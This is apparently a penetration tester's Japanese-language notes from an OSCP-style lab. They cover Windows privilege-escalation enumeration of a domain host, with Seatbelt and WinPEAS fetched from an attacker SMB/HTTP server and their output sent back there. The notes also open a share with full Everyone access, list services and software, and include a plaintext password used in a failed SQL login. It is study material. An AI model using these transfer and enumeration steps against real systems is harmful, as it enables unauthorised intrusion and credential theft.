# Local

## Auto w/ [Seatbelt](https://github.com/GhostPack/Seatbelt)

### 転送・実行

```zsh
# Attacker
mkdir share
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Seatbelt.exe -O share/Seatbelt.exe
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
net use \\192.168.49.104\share /user:username pw
cp \\192.168.49.104\share\Seatbelt.exe .
.\Seatbelt.exe -group=all | Tee-Object -FilePath \\192.168.49.104\share\seatbelt_result.txt
```

### 実行結果抽出

```powershell

```


## Auto w/ [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

### 転送・実行

listenrがうまくいかないので、base64 encodeして強制的に転送しようとしたけど無理だったので、WK26でshareを作成
```powershell
Invoke-WebRequest -Uri http://192.168.49.104:443/winPEASx64.exe -Outfile .\WinPEASx64.exe

# フォルダの作成
mkdir C:\PublicShare

# 共有の設定（Everyoneにフルコントロールを付与）
net share Transfer=C:\PublicShare /grant:Everyone,FULL

# フォルダ自体の権限をEveryoneフルコントロールに
icacls C:\PublicShare /grant "Everyone:(OI)(CI)F" /T
```

```sh
copy \\172.16.104.206\Transfer\WinPEASx64.exe .
```
```powershell
.\winPEASx64.exe | Tee-Object -FilePath \\172.16.104.206\Transfer\peas_result.txt
```

### 実行結果抽出

```powershell
PS C:\Program Files\Microsoft SQL Server> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

---
---

## Manual

### ユーザー

```powershell
PS C:\Program Files\Microsoft SQL Server> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
PS C:\Program Files\Microsoft SQL Server> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
OSCP\Travel Agents                         Group            S-1-5-21-2481101513-2954867870-2660283483-1137 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
```


---

### システム情報


---

### ネットワーク


---

### インストール済みアプリケーション

```powershell
PS C:\Program Files\Microsoft SQL Server> # Access denined?????reg query "HKLM\..."????Get-Item "HKLM\.."
PS C:\Program Files\Microsoft SQL Server> $paths = @(
>> "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*","HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*")
PS C:\Program Files\Microsoft SQL Server> Get-ItemProperty -Path $paths -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName } | Select-Object DisplayName, DisplayVersion, InstallLocation | Sort-Object DisplayName

DisplayName                                                        DisplayVersion  InstallLocation
-----------                                                        --------------  ---------------
Browser for SQL Server 2019                                        15.0.2000.5
Java(TM) SE Development Kit 21.0.3 (64-bit)                        21.0.3.0        C:\Program Files\Java\jdk-21\
Jenkins 2.440.3                                                    2.255.4403
Microsoft ODBC Driver 17 for SQL Server                            17.4.0.1
Microsoft OLE DB Driver for SQL Server                             18.2.3.0
Microsoft SQL Server 2012 Native Client                            11.4.7462.6
Microsoft SQL Server 2019 (64-bit)
Microsoft SQL Server 2019 (64-bit)
Microsoft SQL Server 2019 RsFx Driver                              15.0.2000.5
Microsoft SQL Server 2019 Setup (English)                          15.0.2000.5
Microsoft SQL Server 2019 T-SQL Language Service                   15.0.2000.5
Microsoft Visual C++ 2015-2022 Redistributable (x64) - 14.32.31326 14.32.31326.0
Microsoft Visual C++ 2015-2022 Redistributable (x86) - 14.32.31326 14.32.31326.0
Microsoft Visual C++ 2022 X64 Additional Runtime - 14.32.31326     14.32.31326
Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.32.31326        14.32.31326
Microsoft Visual C++ 2022 X86 Additional Runtime - 14.32.31326     14.32.31326
Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.32.31326        14.32.31326
Microsoft VSS Writer for SQL Server 2019                           15.0.2000.5
SQL Server 2019 Batch Parser                                       15.0.2000.5
SQL Server 2019 Common Files                                       15.0.2000.5
SQL Server 2019 Common Files                                       15.0.2000.5
SQL Server 2019 Connection Info                                    15.0.2000.5
SQL Server 2019 Connection Info                                    15.0.2000.5
SQL Server 2019 Database Engine Services                           15.0.2000.5
SQL Server 2019 Database Engine Services                           15.0.2000.5
SQL Server 2019 Database Engine Shared                             15.0.2000.5
SQL Server 2019 Database Engine Shared                             15.0.2000.5
SQL Server 2019 DMF                                                15.0.2000.5
SQL Server 2019 DMF                                                15.0.2000.5
SQL Server 2019 Shared Management Objects                          15.0.2000.5
SQL Server 2019 Shared Management Objects                          15.0.2000.5
SQL Server 2019 Shared Management Objects Extensions               15.0.2000.5
SQL Server 2019 Shared Management Objects Extensions               15.0.2000.5
SQL Server 2019 SQL Diagnostics                                    15.0.2000.5
SQL Server 2019 XEvent                                             15.0.2000.5
SQL Server 2019 XEvent                                             15.0.2000.5
VMware Tools                                                       12.1.0.20219665 C:\Program Files\VMware\VMware Tools\
```

---

### 実行中のプロセス


---

### サービス

```powershell
type C:\Users\b.martin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
PS C:\Program Files\Microsoft SQL Server> # cmd.exe???:sc query [service] · sc qc [service]
PS C:\Program Files\Microsoft SQL Server> Get-CimInstance -ClassName Win32_Service |
>>   Where-Object {
>>       $_.State -eq 'Running' -and
>>       $_.StartName -notin @('NT AUTHORITY\LocalService', 'NT AUTHORITY\NetworkService')
>>   } |
>>   Select-Object Name, StartName, PathName

Name                          StartName                 PathName
----                          ---------                 --------
DiagTrack                     LocalSystem               C:\Windows\System32\svchost.exe -k utcsvc -p
DsmSvc                        LocalSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
DsSvc                         LocalSystem               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
gpsvc                         LocalSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
IKEEXT                        LocalSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
iphlpsvc                      LocalSystem               C:\Windows\System32\svchost.exe -k NetSvcs -p
Jenkins                       .\jenkins                 "C:\Program Files\Jenkins\jenkins.exe"
KeyIso                        LocalSystem               C:\Windows\system32\lsass.exe
LanmanServer                  LocalSystem               C:\Windows\System32\svchost.exe -k smbsvcs
LSM
MSSQLSERVER                   NT Service\MSSQLSERVER    "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\sqlservr.exe" -sMSSQLSERVER
NcbService                    LocalSystem               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
Netlogon                      LocalSystem               C:\Windows\system32\lsass.exe
Netman                        LocalSystem               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
PcaSvc                        LocalSystem               C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
PlugPlay                      LocalSystem               C:\Windows\system32\svchost.exe -k DcomLaunch -p
Power                         LocalSystem               C:\Windows\system32\svchost.exe -k DcomLaunch -p
ProfSvc                       LocalSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
RasMan                        localSystem               C:\Windows\System32\svchost.exe -k netsvcs
SamSs                         LocalSystem               C:\Windows\system32\lsass.exe
Schedule                      LocalSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
SENS                          LocalSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
SessionEnv                    localSystem               C:\Windows\System32\svchost.exe -k netsvcs -p
ShellHWDetection              LocalSystem               C:\Windows\System32\svchost.exe -k netsvcs -p
SQLSERVERAGENT                NT Service\SQLSERVERAGENT "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\SQLAGENT.EXE" -i MSSQLSERVER
SQLTELEMETRY                  NT Service\SQLTELEMETRY   "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\sqlceip.exe" -Service
SQLWriter                     LocalSystem               "C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe"
StateRepository               LocalSystem               C:\Windows\system32\svchost.exe -k appmodel -p
StorSvc                       LocalSystem               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
SysMain                       LocalSystem               C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
SystemEventsBroker            LocalSystem               C:\Windows\system32\svchost.exe -k DcomLaunch -p
TabletInputService            LocalSystem               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
Themes                        LocalSystem               C:\Windows\System32\svchost.exe -k netsvcs -p
TokenBroker                   LocalSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
TrkWks                        LocalSystem               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
UALSVC                        LocalSystem               C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
UmRdpService                  localSystem               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
UserManager                   LocalSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
UsoSvc                        LocalSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
VaultSvc                      LocalSystem               C:\Windows\system32\lsass.exe
VGAuthService                 LocalSystem               "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
VM3DService                   LocalSystem               C:\Windows\system32\vm3dservice.exe
VMTools                       LocalSystem               "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
WdiSystemHost                 LocalSystem               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
Winmgmt                       localSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
WpnService                    LocalSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
CDPUserSvc_13ac89                                       
```

- ちなみにjenkinsディレクトリにアクセスはできない
```powershell
PS C:\Program Files\Microsoft SQL Server> dir 'C:\Program Files\Jenkins\'
dir : Access to the path 'C:\Program Files\Jenkins' is denied.
At line:1 char:1
+ dir 'C:\Program Files\Jenkins\'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Program Files\Jenkins\:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

```powershell
PS C:\Program Files\Microsoft SQL Server> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\* |
>>   Where-Object {
>>     $_.ObjectName -and
>>     $_.ObjectName -notmatch 'LocalService|NetworkService' -and
>>     $_.ImagePath -and
>>     $_.ImagePath -notmatch '^"?C:\\Windows\\'
>>     # unquoted service path?
>>     # $_.PathName -notmatch '"'
>>   } |
>>   Select PSChildName, ImagePath, ObjectName

PSChildName    ImagePath                                                                                          ObjectName
-----------    ---------                                                                                          ----------
Jenkins        "C:\Program Files\Jenkins\jenkins.exe"                                                             .\jenkins
MSSQLSERVER    "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\sqlservr.exe" -sMSSQLSERVER  NT Service\MSSQLSERVER
Sense          "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                         LocalSystem
SQLSERVERAGENT "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\SQLAGENT.EXE" -i MSSQLSERVER NT Service\SQLSERVERAGENT
SQLTELEMETRY   "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\sqlceip.exe" -Service        NT Service\SQLTELEMETRY
SQLWriter      "C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe"                                    LocalSystem
VGAuthService  "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                             LocalSystem
VMTools        "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                LocalSystem
```

- 編集可能なサービスはなさそう
```powershell
PS C:\Users\b.martin> Get-ModifiableServiceFile
Get-Acl : Attempted to perform an unauthorized operation.
At C:\Users\b.martin\PowerUp.ps1:898 char:17
+                 Get-Acl -Path $CandidatePath | Select-Object -ExpandP ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Get-Acl], UnauthorizedAccessException
    + FullyQualifiedErrorId : System.UnauthorizedAccessException,Microsoft.PowerShell.Commands.GetAclCommand
```

---

### スケジュールタスク

- 以下特にヒットなし
```powershell
$header="HostName","TaskName","NextRunTime","Status","LogonMode","LastRunTime","LastResult","Author","TaskToRun","StartIn","Comment","ScheduledTaskState","IdleTime","PowerManagement","RunAsUser","DeleteTaskIfNotRescheduled","StopTaskIfRunsXHoursandXMins","Schedule","ScheduleType","StartTime","StartDate","EndDate","Days","Months","RepeatEvery","RepeatUntilTime","RepeatUntilDuration","RepeatStopIfStillRunning"
schtasks /query /fo csv /nh /v | ConvertFrom-Csv -Header $header | select -uniq TaskName,NextRunTime,ScheduleType,Status,TaskToRun,RunAsUser | Where-Object {$_.RunAsUser -ne $env:UserName -and $_.TaskToRun -notlike "%windir%*" -and $_.TaskToRun -ne "COM handler" -and $_.TaskToRun -notlike "%systemroot%*" -and $_.TaskToRun -notlike "C:\Windows\*" -and $_.TaskName -notlike "\Microsoft\Windows\*"}
```

```powershell
Get-ModifiableScheduledTaskFile
```

---

### 興味深い情報

#### Microsoft SQL Server

```powershell
PS C:\Program Files\Microsoft SQL Server> tree
Folder PATH listing
Volume serial number is 7CB4-BC42
C:.
├───110
│   ├───KeyFile
│   │   └───1033
│   ├───License Terms
│   └───SDK
│       ├───Include
│       └───Lib
│           ├───x64
│           └───x86
├───150
│   ├───COM
│   │   ├───en
│   │   └───Resources
│   │       └───1033
│   ├───DTS
│   │   ├───Binn
│   │   │   └───Resources
│   │   │       └───1033
│   │   ├───Connections
│   │   │   └───en
│   │   ├───DataDumps
│   │   ├───Extensions
│   │   │   ├───Common
│   │   │   │   └───Jars
│   │   │   └───ODataSource
│   │   │       └───References
│   │   ├───ForEachEnumerators
│   │   │   ├───en
│   │   │   └───Resources
│   │   │       └───1033
│   │   ├───LogProviders
│   │   ├───MappingFiles
│   │   ├───Packages
│   │   ├───PipelineComponents
│   │   │   └───Resources
│   │   │       └───1033
│   │   ├───ProviderDescriptors
│   │   ├───Tasks
│   │   │   └───en
│   │   └───UpgradeMappings
│   ├───KeyFile
│   │   └───1033
│   ├───License Terms
│   ├───SDK
│   │   └───Assemblies
│   │       └───en
│   ├───Setup Bootstrap
│   │   ├───Log
│   │   │   └───20241009_121735
│   │   │       ├───Datastore
│   │   │       └───resources
│   │   └───SQL2019
│   │       ├───1033_ENU_LP
│   │       │   └───x64
│   │       │       └───1033
│   │       ├───Resources
│   │       │   └───1033
│   │       └───x64
│   ├───Shared
│   │   ├───1033
│   │   ├───en
│   │   ├───ErrorDumps
│   │   ├───Resources
│   │   │   └───1033
│   │   └───RsFxInstall
│   └───Tools
│       └───Binn
│           └───Resources
│               └───1033
├───80
│   ├───COM
│   └───Tools
│       └───Binn
├───90
│   ├───License Terms
│   │   └───1033
│   └───Shared
│       └───Resources
│           └───1033
├───Client SDK
│   ├───ODBC
│   │   └───170
│   │       ├───KeyFile
│   │       │   └───1033
│   │       ├───License Terms
│   │       ├───SDK
│   │       │   ├───Include
│   │       │   └───Lib
│   │       │       ├───x64
│   │       │       └───x86
│   │       └───Tools
│   │           └───Binn
│   │               └───Resources
│   │                   └───1033
│   └───OLEDB
│       └───182
│           ├───License Terms
│           └───SDK
│               ├───Include
│               └───Lib
│                   ├───x64
│                   └───x86
└───MSSQL15.MSSQLSERVER
    └───MSSQL
        ├───Backup
        ├───Binn
        │   ├───aetm-enclave.sgx.pkg
        │   ├───aetm-enclave.vsm.pkg
        │   ├───DllTmp32
        │   ├───DllTmp64
        │   ├───Resources
        │   │   ├───1028
        │   │   ├───1029
        │   │   ├───1030
        │   │   ├───1031
        │   │   ├───1032
        │   │   ├───1033
        │   │   ├───1035
        │   │   ├───1036
        │   │   ├───1038
        │   │   ├───1040
        │   │   ├───1041
        │   │   ├───1042
        │   │   ├───1043
        │   │   ├───1044
        │   │   ├───1045
        │   │   ├───1046
        │   │   ├───1049
        │   │   ├───1053
        │   │   ├───1055
        │   │   ├───2052
        │   │   ├───2070
        │   │   └───3082
        │   ├───Templates
        │   └───Xtp
        ├───DATA
        ├───Install
        ├───JOBS
        └───Log
```

```powershell
PS C:\Program Files\Microsoft SQL Server> sqlcmd -U b.martin -P BusyWorkerDay777 -l 30
sqlcmd : Sqlcmd: Error: Microsoft ODBC Driver 17 for SQL Server : Login failed for user 'b.martin'..
At line:1 char:1
+ sqlcmd -U b.martin -P BusyWorkerDay777 -l 30
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (Sqlcmd: Error: ...er 'b.martin'..:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
```

- windows認証を試すも失敗
```powershell
PS C:\Program Files\Microsoft SQL Server> sqlcmd -E
PS C:\Program Files\Microsoft SQL Server> sqlcmd -S localhost -E -l 30
PS C:\Program Files\Microsoft SQL Server>
```

---
---

# Credential harvesting

- cmdkeyなし
- `env`なし
- powershell history: なし（自分がやったコマンドだけ）


---

# WinPEAS結果抽出（長文注意）

```powershell
 [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
     
               ((((((((((((((((((((((((((((((((
        (((((((((((((((((((((((((((((((((((((((((((
      ((((((((((((((**********/##########(((((((((((((   
    ((((((((((((********************/#######(((((((((((
    ((((((((******************/@@@@@/****######((((((((((
    ((((((********************@@@@@@@@@@/***,####((((((((((
    (((((********************/@@@@@%@@@@/********##(((((((((
    (((############*********/%@@@@@@@@@/************((((((((
    ((##################(/******/@@@@@/***************((((((
    ((#########################(/**********************(((((
    ((##############################(/*****************(((((
    ((###################################(/************(((((
    ((#######################################(*********(((((
    ((#######(,.***.,(###################(..***.*******(((((
    ((#######*(#####((##################((######/(*****(((((
    ((###################(/***********(##############()(((((
    (((#####################/*******(################)((((((
    ((((############################################)((((((
    (((((##########################################)(((((((
    ((((((########################################)(((((((
    ((((((((####################################)((((((((
    (((((((((#################################)(((((((((
        ((((((((((##########################)(((((((((
              ((((((((((((((((((((((((((((((((((((((
                 ((((((((((((((((((((((((((((((

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.

  WinPEAS-ng by @hacktricks_live

       /---------------------------------------------------------------------------------\
       |                             Do you like PEASS?                                  |
       |---------------------------------------------------------------------------------| 
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |
       |         Follow on Twitter         :     @hacktricks_live                        |
       |         Respect on HTB            :     SirBroccoli                             |
       |---------------------------------------------------------------------------------|
       |                                 Thank you!                                      |
       \---------------------------------------------------------------------------------/

  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

 You can find a Windows local PE Checklist here: https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
   Creating Dynamic lists, this could take a while, please wait...
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
   - Creating current user groups list...
   - Creating active users list (local only)...
   - Creating disabled users list...
   - Admin users list...
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...


════════════════════════════════════╣ System Information ╠════════════════════════════════════

╔══════════╣ Basic System Information
╚ Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits
    OS Name: Microsoft Windows Server 2019 Standard
    OS Version: 10.0.17763 N/A Build 17763
    System Type: x64-based PC
    Hostname: SRV22
    Domain Name: oscp.exam
    ProductName: Windows Server 2019 Standard
    EditionID: ServerStandard
    ReleaseId: 1809
    BuildBranch: rs5_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 2
    SystemLang: en-US
    KeyboardLang: Japanese (Japan)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: True
    Current Time: 2/22/2026 5:57:46 AM
    HighIntegrity: False
    PartOfDomain: True
    Hotfixes: KB4514366 (9/7/2019), KB4512577 (9/7/2019), KB4512578 (9/7/2019), 


╔══════════╣ Showing All Microsoft Updates
  [X] Exception: Exception has been thrown by the target of an invocation.

╔══════════╣ System Last Shutdown Date/time (from Registry)

    Last Shutdown Date/time        :    10/22/2024 6:54:41 AM

╔══════════╣ User Environment Variables
╚ Check for some passwords or keys in the env variables 
    COMPUTERNAME: SRV22
    USERPROFILE: C:\Users\b.martin
    HOMEPATH: \Users\b.martin
    LOCALAPPDATA: C:\Users\b.martin\AppData\Local
    PSModulePath: C:\Users\b.martin\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Microsoft SQL Server\150\Tools\PowerShell\Modules\
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Program Files\Common Files\Oracle\Java\javapath;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\;C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\150\DTS\Binn\;C:\Users\b.martin\AppData\Local\Microsoft\WindowsApps;
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 6
    LOGONSERVER: \\DC20
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
    HOMEDRIVE: C:
    SystemRoot: C:\Windows
    TEMP: C:\Users\BF116~1.MAR\AppData\Local\Temp\2
    SESSIONNAME: RDP-Tcp#0
    ALLUSERSPROFILE: C:\ProgramData
    DriverData: C:\Windows\System32\Drivers\DriverData
    FPS_BROWSER_APP_PROFILE_STRING: Internet Explorer
    APPDATA: C:\Users\b.martin\AppData\Roaming
    PROCESSOR_REVISION: 4f01
    USERNAME: b.martin
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    CLIENTNAME: kali
    OS: Windows_NT
    USERDOMAIN_ROAMINGPROFILE: OSCP
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    ComSpec: C:\Windows\system32\cmd.exe
    SystemDrive: C:
    FPS_BROWSER_USER_PROFILE_STRING: Default
    ProgramFiles: C:\Program Files
    NUMBER_OF_PROCESSORS: 2
    TMP: C:\Users\BF116~1.MAR\AppData\Local\Temp\2
    ProgramData: C:\ProgramData
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: OSCP
    PUBLIC: C:\Users\Public
    USERDNSDOMAIN: OSCP.EXAM

╔══════════╣ System Environment Variables
╚ Check for some passwords or keys in the env variables 
    ComSpec: C:\Windows\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    OS: Windows_NT
    Path: C:\Program Files\Common Files\Oracle\Java\javapath;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\;C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\150\DTS\Binn\
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Microsoft SQL Server\150\Tools\PowerShell\Modules\
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 2
    PROCESSOR_LEVEL: 6
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    PROCESSOR_REVISION: 4f01

╔══════════╣ Audit Settings
╚ Check what is being logged 
    Not Found

╔══════════╣ Audit Policy Settings - Classic & Advanced

╔══════════╣ WEF Settings
╚ Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

╔══════════╣ LAPS Settings
╚ If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

╔══════════╣ Wdigest
╚ If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wdigest
    Wdigest is not enabled

╔══════════╣ LSA Protection
╚ If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#lsa-protection
    LSA Protection is not enabled

╔══════════╣ Credentials Guard
╚ If enabled, a driver is needed to read LSASS memory https://book.hacktricks.wiki/windows-hardening/stealing-credentials/credentials-protections#credentials-guard
    CredentialGuard is not enabled
    Virtualization Based Security Status:      Not enabled
    Configured:                                False
    Running:                                   False

╔══════════╣ Cached Creds
╚ If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cached-credentials
    cachedlogonscount is 10

╔══════════╣ Enumerating saved credentials in Registry (CurrentPass)

╔══════════╣ AV Information
  [X] Exception: Invalid namespace 
    No AV was detected!!
    Not Found

╔══════════╣ Windows Defender configuration
  Local Settings
  Group Policy Settings

╔══════════╣ UAC Status
╚ If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#from-administrator-medium-to-high-integrity-level--uac-bypasss
    ConsentPromptBehaviorAdmin: 0 - No prompting
    EnableLUA: 0
    LocalAccountTokenFilterPolicy: 1
    FilterAdministratorToken: 1
      [*] EnableLUA != 1, UAC policies disabled.
      [+] Any local account can be used for lateral movement.

╔══════════╣ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\b.martin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 638B

╔══════════╣ Enumerating PowerShell Session Settings using the registry
      You must be an administrator to run this check

╔══════════╣ PS default transcripts history
╚ Read the PS history inside these files (if any)

╔══════════╣ HKCU Internet Settings
    DisableCachingOfSSLPages: 1
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 2688
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    CertificateRevocation: 1
    ZonesSecurityUpgrade: System.Byte[]
    WarnonZoneCrossing: 1

╔══════════╣ HKLM Internet Settings
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

╔══════════╣ Drives Information
╚ Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 36 GB)(Permissions: Users [Allow: AppendData/CreateDirectories])
    D:\ (Type: CDRom)

╔══════════╣ Checking WSUS
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wsus
    Not Found

╔══════════╣ Checking KrbRelayUp
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#krbrelayup
